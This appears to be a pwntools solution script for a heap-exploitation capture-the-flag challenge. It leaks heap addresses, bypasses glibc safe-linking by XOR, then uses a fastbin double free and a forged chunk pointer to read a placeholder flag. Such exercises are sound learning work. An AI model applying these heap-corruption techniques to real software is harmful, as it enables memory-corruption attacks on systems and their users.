from pwn import *

p = process('./k511.elf',env={"FLAG": "CTF{example_flag}"})
gdb.attach(p)

# context.log_level = 'DEBUG'
# context.binary = './k511.elf'

def create_memory(data):
    p.send(b'1\n')
    p.recvuntil(b'\n')
    p.send(data)
    p.recvuntil(b'\n\n')
def read_memory(slot):
    p.send(b'2\n')
    p.recvuntil(b'\n')
    p.send(slot)
    r = p.recvuntil(b'\n\n')
    return r.split(b'"')[1]
def erase_memory(slot):
    p.send(b'3\n')
    p.recvuntil(b'\n')
    p.send(slot)
    p.recvuntil(b'\n\n')   


p.recvuntil(b'Quit.\n\n')

# This is a step to get tcache full, malloc total of  9 chunks, then free first 7 chunks to get tcache bin fulfiled.
for i in range(9):
    create_memory(b'vnpd\n')

# Now lets free
erase_memory(b'9\n')
erase_memory(b'8\n')
erase_memory(b'7\n')
erase_memory(b'6\n')
erase_memory(b'5\n')
erase_memory(b'1\n')
erase_memory(b'3\n')

# So those two will appear in fast bin
erase_memory(b'4\n')
erase_memory(b'2\n')

create_memory(b'vnpd\n')


a4 = read_memory(b'4\n') # Get the base address
a2 = read_memory(b'2\n') # Get a protected address to the heap


# print(hex(a2))
# print(hex(a4))

# Perform XOR operation to get the real address to the heap
base_address = bytes(reversed(a4)).hex()
protected_address = bytes(reversed(a2)).hex()
unprotected_address = hex(int(base_address, 16) ^ int(protected_address, 16))[2:]
print("Protected = 0x" + protected_address)
print("Unprotected = 0x" + unprotected_address)


# So basically we can get address of the ptr stores flag from the address we leaked, the offset between them is 160
# pwndbg> p/x 0x55e8c4f633d0 - 0x55e8c4f63330
# $1 = 0xa0
# pwndbg> p/d 0xa0
# $2 = 160

# Similarly, we can calculate the position of offset 0
# 0x55e8c4f633d0 - 0x55e8c4f632a0 = 304

flag_position = hex(int(unprotected_address, 16) - 160)[2:]
offset_0_position = hex(int(unprotected_address, 16) - 304)[2:]

print("Flag = 0x" + flag_position)
print("Offset 0 position = 0x" + offset_0_position)
protected_slot_zero_address = hex(int(base_address, 16) ^ int(offset_0_position, 16))[2:]
print("Slot 0 protected address = 0x" + protected_slot_zero_address)

#  STage 2: DOuble free lets go

erase_memory(b'1\n')
erase_memory(b'4\n')

# Clear all tcache
for i in range(7):
    create_memory(b'vnpd\n')
# create_memory(bytes(reversed(bytes.fromhex(protected_slot_zero_address))) + b'\x00\n')
# it overwrites fd of the head of the fastbin to position of slot 0 (in the protected way), after that it will point to it. so perfect. 

create_memory(bytes(reversed(bytes.fromhex(protected_slot_zero_address))) + b'\x00\n')

# SO now we will have to allocate  2 times, then the 3 one will be that offset 0
create_memory(b'vnpd\n')
create_memory(b'vnpd\n')
create_memory(b'A'*8 + bytes(reversed(bytes.fromhex(flag_position))) + b'\x00\n')

flag = read_memory(b'1\n')
print(flag)

p.interactive()